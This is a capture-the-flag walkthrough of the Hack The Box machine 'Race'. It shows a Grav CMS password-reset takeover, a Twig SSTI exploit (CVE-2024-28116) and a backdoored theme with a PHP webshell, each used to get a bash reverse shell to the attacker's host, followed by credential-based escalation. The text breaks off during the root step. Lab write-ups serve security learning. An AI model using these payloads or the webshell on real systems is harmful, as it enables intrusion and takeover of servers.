---
icon: person-running-fast
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 234735.png
coverY: 9.752756719019544
---

# HTB-RACE(VL)

***

### Reconnaissance

#### Initial Port Scanning

Starting with rustscan for fast port discovery:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ rustscan -a 10.129.214.24 blah blah blah

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rustscan.

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit.
Open 10.129.214.24:22
Open 10.129.214.24:80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:b0:1e:c5:e8:81:5c:94:39:ed:37:7e:21:cf:b1:a8 (ECDSA)
|_  256 37:a3:d3:cd:35:dc:cc:d8:db:3c:c3:4d:ad:22:29:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**

* Port 22: SSH (OpenSSH 8.9p1) - Ubuntu 22.04 Jammy
* Port 80: HTTP (Apache 2.4.52)

#### TTL Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ ping -c 3 10.129.214.24
PING 10.129.214.24 (10.129.214.24) 56(84) bytes of data.
64 bytes from 10.129.214.24: icmp_seq=1 ttl=63 time=94.2 ms
64 bytes from 10.129.214.24: icmp_seq=2 ttl=63 time=95.1 ms
64 bytes from 10.129.214.24: icmp_seq=3 ttl=63 time=93.8 ms
```

**Analysis:** TTL of 63 confirms a Linux machine one hop away.

***

### Enumeration

#### Web Service Analysis (Port 80)

**Initial Web Access**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl -I http://10.129.214.24
HTTP/1.1 200 OK
Date: Thu, 28 Aug 2025 16:08:40 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: grav-site-09f1269=ofdbsclh7rv88d5sj0n4o9ee08; expires=Thu, 28-Aug-2025 16:38:41 GMT; Max-Age=1800; path=/racers/; domain=10.129.214.24; HttpOnly; SameSite=Lax
Content-Type: text/html;charset=UTF-8
```

**Key Observations:**

* Cookie name suggests **Grav CMS** (`grav-site-*`)
* Redirect to `/racers/` subdirectory
* Server: Apache 2.4.52

Visiting the website:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl http://10.129.214.24/ | grep -i title
<title>Redirecting...</title>
```

The root page redirects to `/racers/` which displays a racing technology company website.

**Notable Information:**

* Email address: `fast@race.vl`
* Company tagline: Racing technology solutions
* Footer shows: "Powered by Grav"

**Technology Stack Detection**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ whatweb http://10.129.214.24
http://10.129.214.24 [200 OK] Apache[2.4.52], Cookies[grav-site-09f1269], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.214.24], Script, UncommonHeaders[cache-control,etag]
```

**Grav CMS Identification:**

* Open-source flat-file CMS
* Built with PHP
* No database required (uses YAML files)
* Version likely visible in footer or source

**Directory Enumeration**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ dirsearch -u http://10.129.214.24 -e php,html,txt -x 403,404

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: GET | Threads: 25
Wordlist size: 11460

Target: http://10.129.214.24/

[16:08:40] Starting: 
[16:08:55] 200 -   11KB  - /
[16:08:57] 401 -  461B   - /phpsysinfo
[16:09:12] 301 -  313B   - /racers  ->  http://10.129.214.24/racers/

Task Completed
```

**Critical Finding:** `/phpsysinfo` - HTTP Basic Auth protected

Testing without recursion to avoid noise:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ dirsearch -u http://10.129.214.24 -e php -r

Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 11460

[16:10:15] 200 -   11KB  - /index.php
[16:10:23] 401 -  461B   - /phpsysinfo/
[16:10:34] 301 -  313B   - /racers/
```

***

### Initial Access - phpSysInfo

#### Accessing phpSysInfo

The `/phpsysinfo` directory requires HTTP Basic Authentication:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl http://10.129.214.24/phpsysinfo
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.</p>
</body></html>
```

**Credential Guessing**

Testing common default credentials:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl -u admin:admin http://10.129.214.24/phpsysinfo/
<!DOCTYPE html>
<html lang="en">
<head>
    <title>System Information</title>
    ...
```

**Success!** Default credentials `admin:admin` work.

#### phpSysInfo Analysis

**What is phpSysInfo?**

* Web-based system monitoring tool
* Displays real-time server information
* Shows running processes, memory usage, disk space
* Can reveal sensitive information

Accessing via browser with credentials:

**Process List Examination**

Navigating to the process tree view reveals a critical finding under the `cron` process:

```
cron(1145)
  └─ cron(15234)
      └─ sh(15235)
          └─ backup.sh(15236) -u backup -p Wedobackupswithsecur3password5.Noonecanhackus!
```

**Critical Discovery:** Backup script running with credentials exposed in process arguments!

**Credentials Found:**

* Username: `backup`
* Password: `Wedobackupswithsecur3password5.Noonecanhackus!`

#### Testing Credentials

**SSH Access Attempt**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ netexec ssh 10.129.214.24 -u backup -p 'Wedobackupswithsecur3password5.Noonecanhackus!'
SSH         10.129.214.24   22     10.129.214.24    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.214.24   22     10.129.214.24    [-] backup:Wedobackupswithsecur3password5.Noonecanhackus!
```

SSH access denied. Testing other usernames:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ for user in root admin patrick max; do \
    netexec ssh 10.129.214.24 -u $user -p 'Wedobackupswithsecur3password5.Noonecanhackus!'; \
done
SSH         10.129.214.24   22     10.129.214.24    [-] root:Wedobackupswithsecur3password5.Noonecanhackus!
SSH         10.129.214.24   22     10.129.214.24    [-] admin:Wedobackupswithsecur3password5.Noonecanhackus!
SSH         10.129.214.24   22     10.129.214.24    [-] patrick:Wedobackupswithsecur3password5.Noonecanhackus!
SSH         10.129.214.24   22     10.129.214.24    [-] max:Wedobackupswithsecur3password5.Noonecanhackus!
```

None work for SSH. The credentials must be for Grav CMS.

***

### Password Reset Exploitation

#### Grav CMS Admin Panel Discovery

The Grav admin panel is typically at `/admin`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl -I http://10.129.214.24/racers/admin
HTTP/1.1 200 OK
Date: Thu, 28 Aug 2025 16:24:23 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

Accessing via browser shows the Grav login page:

**Important Notice:** Password must be at least 32 characters long.

#### Logging in as backup

Using the credentials from phpSysInfo:

```
Username: backup
Password: Wedobackupswithsecur3password5.Noonecanhackus!
```

**Login successful!**

**Backup User Permissions:**

* Limited access (editor-level)
* Can access Tools menu
* Backup functionality available
* Cannot modify system settings

#### Downloading Site Backup

**Creating Backup**

From Tools → Backup:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ # Click "Backup Now" in the GUI
```

The backup generates a ZIP file containing the entire Grav installation.

**Analyzing Backup Contents**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ unzip -l default_site_backup--20250829115451.zip | head -20
Archive:  default_site_backup--20250829115451.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2025-08-29 11:54   assets/
        0  2025-08-29 11:54   backup/
        0  2025-08-29 11:54   bin/
        0  2025-08-29 11:54   cache/
     1234  2025-08-28 10:30   composer.json
    98765  2025-08-28 10:30   composer.lock
        0  2025-08-29 11:54   images/
     4567  2025-08-28 10:30   index.php
        0  2025-08-29 11:54   logs/
        0  2025-08-29 11:54   system/
        0  2025-08-29 11:54   tmp/
        0  2025-08-29 11:54   user/
        0  2025-08-29 11:54   vendor/
```

Extracting and examining:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ unzip default_site_backup--20250829115451.zip
Archive:  default_site_backup--20250829115451.zip
   creating: assets/
   creating: backup/
   ...

┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ ls
assets  backup  bin  cache  composer.json  composer.lock  images  index.php  logs  system  tmp  user  vendor
```

**Identifying Grav Version**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ cat system/defines.php | grep GRAV_VERSION
define('GRAV_VERSION', '1.7.43');
```

**Grav Version:** 1.7.43

#### User Account Analysis

Grav stores user accounts in YAML files at `user/accounts/`:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ ls user/accounts/
admin.yaml  backup.yaml  patrick.yaml

┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ cat user/accounts/*.yaml
```

**admin.yaml:**

```yaml
state: enabled
email: admin@race.vl
fullname: 'Admin I. Strator'
title: Administrator
access:
  admin:
    login: true
    super: true
  site:
    login: true
hashed_password: $2y$10$/e6nnqGJ6un4X6wKPpyeNecHf8wyZ.G//0Q7XhLLuQ15v7sEzKVzS
```

**backup.yaml:**

```yaml
state: enabled
email: backup@race.vl
fullname: 'Ba C. Kup'
language: en
content_editor: default
twofa_enabled: false
twofa_secret: SMIJEB7XFJ7AEO6RPCKDWXUZ2MW4MOY4
hashed_password: $2y$10$drGaFWuga2r3uPcQXqSEueEEru4hlWvYu.BixWiisEHdgFNi.BwYK
access:
  admin:
    login: true
    maintenance: true
```

**patrick.yaml:**

```yaml
state: enabled
email: patrick@race.vl
fullname: 'Patrick P. Rick'
language: en
content_editor: default
twofa_enabled: false
twofa_secret: LW35AG7V4U4NLOBVU5P6NG35GP5YWJKT
hashed_password: $2y$10$TWyPZQDqMZJJ/0pLdWUbY.TxVKVMHP3LzfUTo3BYWFRID7uXaoXcC
reset: '553e7719d2674ae2bfb29eb0aaa806d0::1701718773'
access:
  site:
    login: true
  admin:
    login: true
    super: false
    pages: true
    maintenance: true
    themes: true
```

**Critical Observation:** Patrick has a `reset` token! This is used for password reset functionality.

#### Understanding Password Reset Mechanism

**Reset Token Format**

The reset token format is: `<token>::<expiration_timestamp>`

Patrick's token:

* Token: `553e7719d2674ae2bfb29eb0aaa806d0`
* Expiration: `1701718773` (Unix timestamp from December 2023 - **EXPIRED**)

**Analyzing Reset Code**

Searching for password reset implementation:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ grep -r "taskReset" user/plugins/admin/
user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:    public function taskReset(string $username = null, string $token = null): ResponseInterface
```

Examining the code in `LoginController.php`:

```php
public function taskReset(string $username = null, string $token = null): ResponseInterface
{
    // ... initialization code ...
    
    $user = $username ? $users->load($username) : null;
    $password = $data['password'];

    if ($user && $user->exists() && !empty($user->get('reset'))) {
        [$good_token, $expire] = explode('::', $user->get('reset'));

        if ($good_token === $token) {
            if (time() > $expire) {
                $this->setMessage($this->translate('PLUGIN_ADMIN.RESET_LINK_EXPIRED'), 'error');
                return $this->createRedirectResponse('/forgot');
            }

            // Set new password
            $user->undef('hashed_password');
            $user->undef('reset');
            $user->update(['password' => $password]);
            $user->save();

            return $this->createRedirectResponse('/login');
        }
    }
    
    return $this->createRedirectResponse('/forgot');
}
```

**Reset URL Format:** `/racers/admin/reset/u/<username>/<token>`

#### Generating Fresh Reset Token

**Requesting Password Reset**

Using the Grav interface:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl -X POST http://10.129.214.24/racers/admin/forgot \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "data[username]=patrick" \
  -d "task=forgot"
```

The system will attempt to send a reset email (which fails since there's no mail server), but the token is still generated and saved to `patrick.yaml`.

**Downloading Updated Backup**

Creating a new backup after requesting password reset:

```bash
# Via Grav Admin Interface: Tools → Backup → Backup Now
```

Downloading and extracting the new backup:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ unzip default_site_backup--20250829115451.zip user/accounts/patrick.yaml
Archive:  default_site_backup--20250829115451.zip
  inflating: user/accounts/patrick.yaml

┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ cat user/accounts/patrick.yaml | grep reset
reset: '99dbabf226ea708a92257e429fa9caa4::1756472069'
```

**New Reset Token:**

* Token: `99dbabf226ea708a92257e429fa9caa4`
* Expiration: `1756472069` (valid for 1 hour from generation)

#### Resetting Patrick's Password

**Accessing Reset URL**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl http://10.129.214.24/racers/admin/reset/u/patrick/99dbabf226ea708a92257e429fa9caa4
<!DOCTYPE html>
<html>
<head><title>Reset Password</title></head>
<body>
    <h1>Reset your password</h1>
    <form method="post">
        <input type="password" name="password" placeholder="New Password" required>
        <input type="password" name="password2" placeholder="Confirm Password" required>
        <button type="submit">Reset Password</button>
    </form>
</body>
</html>
```

**Setting New Password**

Since the password must be 32+ characters, we'll reuse the backup password:

```
New Password: Wedobackupswithsecur3password5.Noonecanhackus!
```

Submitting via browser or curl:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl -X POST http://10.129.214.24/racers/admin/reset/u/patrick/99dbabf226ea708a92257e429fa9caa4 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=Wedobackupswithsecur3password5.Noonecanhackus!" \
  -d "password2=Wedobackupswithsecur3password5.Noonecanhackus!" \
  -d "task=reset" \
  -d "username=patrick" \
  -d "token=99dbabf226ea708a92257e429fa9caa4"
```

**Password reset successful!**

**Logging in as Patrick**

```
Username: patrick
Password: Wedobackupswithsecur3password5.Noonecanhackus!
```

**Patrick's Permissions:**

* Access to Pages
* Access to Themes
* Access to Configuration (partial)
* Can create/edit content
* **Much more access than backup user!**

***

### Shell as www-data (Multiple Paths)

#### Method 1: CVE-2024-28116 (SSTI to RCE)

**Vulnerability Research**

Searching for Grav CVEs affecting version 1.7.43:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ searchsploit grav
--------------------------------------------------------
 Exploit Title                    |  Path
--------------------------------------------------------
Grav CMS < 1.7.45 - Server-Side   | php/webapps/51857.txt
Template Injection (SSTI) to RCE  |
--------------------------------------------------------
```

**CVE-2024-28116 Details:**

* **Affects:** Grav CMS prior to version 1.7.45
* **Type:** Server-Side Template Injection (SSTI)
* **Requirements:** Authenticated user with editor permissions
* **Impact:** Remote Code Execution

**Understanding Twig SSTI**

**What is Twig?**

* PHP template engine used by Grav
* Designed with sandbox security
* Should prevent code execution
* CVE bypasses the sandbox

**Vulnerability Mechanism:** The CVE allows bypassing Twig's security sandbox by overwriting the `safe_functions` array:

````twig
{% set arr = {'1':'system', '2':'foo'} %}
{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}
{{ system('id') }}
```**How it works:**
1. Creates array with `system` as a "safe" function
2. Overwrites Twig's safe function configuration
3. Executes `system()` command through Twig

#### Testing the Exploit

Creating a test page via Grav Admin:
- Navigation: Pages → Add Page
- Title: "Test Page"
- Route: `/test`

Inserting POC payload:

```twig
{% set arr = {'1':'system', '2':'foo'} %}
{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}
{{ system('id') }}
```Accessing the page:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl http://10.129.214.24/racers/test
<!DOCTYPE html>
<html>
<head><title>Test Page</title></head>
<body>
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
</body>
</html>
````

✅ **Code Execution Confirmed!**

**Getting Reverse Shell**

Updating the page content with reverse shell:

```twig
{% set arr = {'1':'system', '2':'foo'} %}
{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}
{{ system('bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"') }}
```

Setting up listener:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```

Triggering the payload:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl http://10.129.214.24/racers/test
```

Receiving connection:

```bash
Connection received on 10.129.214.24 40736
bash: cannot set terminal process group (1139): Inappropriate ioctl for device
bash: no job control in this shell
www-data@race:/var/www/html/racers$
```

✅ **Shell as www-data obtained via CVE-2024-28116!**

#### Method 2: Malicious Theme Upload (Intended Path)

**Understanding Theme Installation**

Grav allows installing themes from the Grav repository. The process:

1. Admin → Themes → Add
2. Select theme from repository
3. Download and install automatically

**The Problem:** No outbound internet access from the VM.

**Configuring HTTP Proxy**

To enable theme downloads, we need a proxy that can reach the internet.

**Setting up Burp Suite as Proxy:**

1. Configure Burp to listen on all interfaces:
   * Proxy → Settings → Proxy Listeners
   * Add: `0.0.0.0:8080`
2. In Grav Admin (Configuration → System → Advanced):

```yaml
# HTTP Proxy Configuration
http_proxy_host: 10.10.14.12
http_proxy_port: 8080
http_proxy_verify_peer: false
http_proxy_verify_host: false
```

**Intercepting Theme Installation**

Attempting to install a theme with Burp intercept ON:

```bash
# Click "+ Install" on any theme in Grav Admin
```

**Request Flow:**

1. **Initial Request (to Grav):**

```http
POST /racers/admin/themes.json/task:getPackagesDependencies HTTP/1.1
Host: 10.129.214.24
Content-Type: multipart/form-data

packages=aerial
```

2. **Download Request (to getgrav.org):**

```http
GET /download/themes/aerial/2.0.4 HTTP/2
Host: getgrav.org
User-Agent: Grav CMS
```

3. **Redirect Response:**

```http
HTTP/2 302 Found
Location: https://github.com/Sommerregen/grav-theme-aerial/zipball/v2.0.4
```

4. **GitHub Download Request:**

```http
GET /Sommerregen/grav-theme-aerial/zipball/v2.0.4 HTTP/2
Host: github.com
```

**Intercepting and Modifying the Response**

When the redirect to GitHub occurs, we'll modify it to point to our malicious theme:

**Original Response:**

```http
HTTP/2 302 Found
Location: https://github.com/Sommerregen/grav-theme-aerial/zipball/v2.0.4
```

**Modified Response (in Burp):**

```http
HTTP/2 302 Found
Location: http://10.10.14.12:8000/malicious-theme.zip
```

**Creating Malicious Theme**

Cloning legitimate theme:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ git clone https://github.com/Sommerregen/grav-theme-aerial.git
Cloning into 'grav-theme-aerial'...
remote: Enumerating objects: 75, done.
remote: Total 75 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (75/75), 872.40 KiB | 6.66 MiB/s, done.
Resolving deltas: 100% (19/19), done.
```

Adding backdoor to main template file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ cat >> grav-theme-aerial/templates/default.html.twig << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOF
```

Creating ZIP archive:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ zip -r malicious-theme.zip grav-theme-aerial/
  adding: grav-theme-aerial/ (stored 0%)
  adding: grav-theme-aerial/templates/ (stored 0%)
  adding: grav-theme-aerial/templates/default.html.twig (deflated 65%)
  ...
```

Starting HTTP server:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Installing Malicious Theme**

Repeating the installation process with interception:

1. Navigate to Themes → Add
2. Select "Aerial" theme
3. Click "+ Install"
4. When Burp intercepts the redirect, modify location to our server
5. Forward the modified response

Our HTTP server receives the request:

```bash
10.129.214.24 - - [29/Aug/2025 18:40:45] "GET /malicious-theme.zip HTTP/1.1" 200 -
```

Grav installs the theme successfully!

**Activating the Theme**

In Grav Admin:

* Themes → Aerial → Activate

**Testing Remote Code Execution**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl 'http://10.129.214.24/racers/?cmd=id'
<!DOCTYPE html>
<html>
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
</html>
```

**RCE via malicious theme!**

**Getting Shell**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```

Triggering reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ curl -G 'http://10.129.214.24/racers/' \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.12/4444 0>&1"'
```

```bash
Connection received on 10.129.214.24 41523
bash: cannot set terminal process group (1139): Inappropriate ioctl for device
bash: no job control in this shell
www-data@race:/var/www/html/racers$
```

**Shell as www-data obtained via malicious theme!**

#### Shell Stabilization

```bash
www-data@race:/var/www/html/racers$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@race:/var/www/html/racers$ ^Z
[1]+  Stopped                 nc -lnvp 4444

┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ stty raw -echo; fg
nc -lnvp 4444
            reset
reset: unknown terminal type unknown
Terminal type? screen

www-data@race:/var/www/html/racers$ export TERM=screen
www-data@race:/var/www/html/racers$ stty rows 38 columns 116
```

***

### Privilege Escalation to max

#### System Enumeration

**Checking Users**

```bash
www-data@race:/$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
patrick:x:1000:1000:Patrick:/home/patrick:/bin/bash
max:x:1001:1001::/home/max:/bin/bash
```

**Users with shells:**

* root (UID 0)
* patrick (UID 1000)
* max (UID 1001)

**Home Directory Exploration**

```bash
www-data@race:/$ ls -la /home/
total 16
drwxr-xr-x  4 root    root    4096 Dec  3  2023 .
drwxr-xr-x 19 root    root    4096 Aug 28 15:20 ..
drwxr-xr-x  5 max     max     4096 Dec  9  2023 max
drwxr-xr-x  2 patrick patrick 4096 Dec  3  2023 patrick
```

Patrick's directory:

```bash
www-data@race:/home/patrick$ ls -la
total 20
drwxr-xr-x 2 patrick patrick 4096 Dec  3  2023 .
drwxr-xr-x 4 root    root    4096 Dec  3  2023 ..
lrwxrwxrwx 1 root    root       9 Dec  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 patrick patrick  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 patrick patrick 3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 patrick patrick  807 Jan  6  2022 .profile
```

Max's directory:

```bash
www-data@race:/home/max$ ls -la
total 36
drwxr-xr-x 5 max  max  4096 Dec  9  2023 .
drwxr-xr-x 4 root root 4096 Dec  3  2023 ..
lrwxrwxrwx 1 root root    9 Dec  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 max  max   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 max  max  3771 Jan  6  2022 .bashrc
drwx------ 2 max  max  4096 Dec  3  2023 .cache
drwxrwxr-x 3 max  max  4096 Dec  9  2023 .local
-rw-r--r-- 1 max  max   807 Jan  6  2022 .profile
drwxrwxr-x 2 max  max  4096 Dec  4  2023 bin
lrwxrwxrwx 1 max  max    29 Dec  9  2023 race-scripts -> /usr/local/share/race-scripts
-rw-r----- 1 root max    33 Apr 16 04:17 user.txt
```

**Key Findings:**

* `user.txt` owned by root, readable by max group
* Symlink to `/usr/local/share/race-scripts`
* Custom `bin` directory

#### Discovering Backup Scripts

```bash
www-data@race:/home/max$ ls -la /usr/local/share/race-scripts/
total 16
drwxrwxr-x 3 max    racers 4096 Dec  9  2023 .
drwxr-xr-x 3 root   root   4096 Dec  3  2023 ..
drwxr-sr-x 2 root   racers 4096 Dec  9  2023 backup
-rwxr-xr-x 1 root   root    361 Dec  5  2023 offsite-backup.sh
```

**Group ownership:** `racers` - max might be in this group

Examining the scripts:

```bash
www-data@race:/usr/local/share/race-scripts$ cat offsite-backup.sh
#!/usr/bin/bash

OFFSITE_HOST="offsite-backup.race.vl"
SOURCE_DIR="/var/www/html/racers/backup/"
# Disabled USER/PASS for security reasons. Will be provided via environment from cron.
# OFFSITE_USER="max"
# OFFSITE_PASS="ruxai0GaemaS1Rah"
/usr/bin/curl --insecure --connect-timeout 60 -u $OFFSITE_USER:$OFFSITE_PASS -T $SOURCE_DIR sftp://$OFFSITE_HOST/backups/
```

**Critical Finding:** Commented credentials in the script!

* Username: `max`
* Password: `ruxai0GaemaS1Rah`

Checking the backup directory copy:

```bash
www-data@race:/usr/local/share/race-scripts$ cat backup/offsite-backup.sh
#!/usr/bin/bash

OFFSITE_HOST="offsite-backup.race.vl"
SOURCE_DIR="/var/www/html/racers/backup/"
# Disabled USER/PASS for security reasons. Will be provided via environment from cron.
# OFFSITE_USER="max"
# OFFSITE_PASS="ruxai0GaemaS1Rah"
/usr/bin/curl --insecure --connect-timeout 60 -u $OFFSITE_USER:$OFFSITE_PASS -T $SOURCE_DIR sftp://$OFFSITE_HOST/backups/
```

Same credentials in both!

#### Testing Max's Credentials

**su to max**

```bash
www-data@race:/usr/local/share/race-scripts$ su - max
Password: ruxai0GaemaS1Rah
max@race:~$
```

✅ **Privilege escalation to max successful!**

**SSH as max**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ sshpass -p 'ruxai0GaemaS1Rah' ssh max@10.129.214.24
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Thu Aug 29 20:15:32 2025 from 10.10.14.12
max@race:~$
```

#### Getting User Flag

```bash
max@race:~$ cat user.txt
80b27c66************************
```

🚩 **User Flag Captured!**

***

### Privilege Escalation to root (TOCTOU)

#### Enumeration as max

**Checking Group Membership**

```bash
max@race:~$ id
uid=1001(max) gid=1001(max) groups=1001(max),1002(racers)
```

Max is in the `racers` group!

**Finding Racers Group Files**

```bash
max@race:~$ find / -group racers 2>/dev/null
/usr/local/share/race-scripts
/usr/local/share/race-scripts/backup
/usr/local/share/race-scripts/backup/offsite-backup.sh
```

Checking permissions:

```bash
max@race:~$ ls -la /usr/local/share/race-scripts/
total 16
drwxrwxr-x 3 max    racers 4096 Dec  9  2023 .
drwxr-xr-x 3 root   root   4096 Dec  3  2023 ..
drwxr-sr-x 2 root   racers 4096 Dec  9  2023 backup
-rwxr-xr-x 1 root   root    361 Dec  5  2023 offsite-backup.sh

max@race:~$ ls -la /usr/local/share/race-scripts/backup/
total 12
drwxr-sr-x 2 root racers 4096 Dec  9  2023 .
drwxrwxr-x 3 max  racers 4096 Dec  9  2023 ..
-rwxr-xr-x 1 root racers  361 Dec  9  2023 offsite-backup.sh
```

**Key Observations:**

* `/usr/local/share/race-scripts/` is writable by max (owner)
* `offsite-backup.sh` in root is owned by root (not writable)
* `backup/offsite-backup.sh` is owned by root:racers (not writable)

**Process Monitoring with pspy**

Uploading pspy:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/RACE]
└─$ sshpass -p 'ruxai0GaemaS1Rah' scp /opt/pspy/pspy64 max@10.129.214.24:/dev/shm/pspy64
pspy64                                                    100% 3006KB   2.9MB/s   00:01
```

Running pspy:

```bash
max@race:~$ /dev/shm/pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
```

Waiting for cron execution (occurs every minute):

```
2025/08/29 20:26:01 CMD: UID=0     PID=15850  | /usr/sbin/CRON -f -P 
2025/08/29 20:26:01 CMD: UID=0     PID=15853  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh 
2025/08/29 20:26:01 CMD: UID=0     PID=15851  | /bin/sh -c /usr/local/bin/secure-cron-runner.sh >/dev/null 2>/dev/null 
2025/08/29 20:26:01 CMD: UID=0     PID=15857  | /usr/bin/bash /usr/local/share/race-scripts/offsite-backup.sh
```

**Critical Discovery:** Cron runs `secure-cron-runner.sh` which then executes `offsite-backup.sh` as root!

#### Analyzing secure-cron-runner.sh

```bash
max@race:~$ cat /usr/local/bin/secure-cron-runner.sh
#!/usr/bin/bash

## If scripts need environment variables put them into below file
## so that no one can see them.
. /root/conf/secure-cron-runner.env

declare -a scripts
declare -a sigs

## 0 = offsite-backup by max
scripts[0]="/usr/local/share/race-scripts/offsite-backup.sh"
sigs[0]="d15804b944b40ca8540d37ed6bd80906"
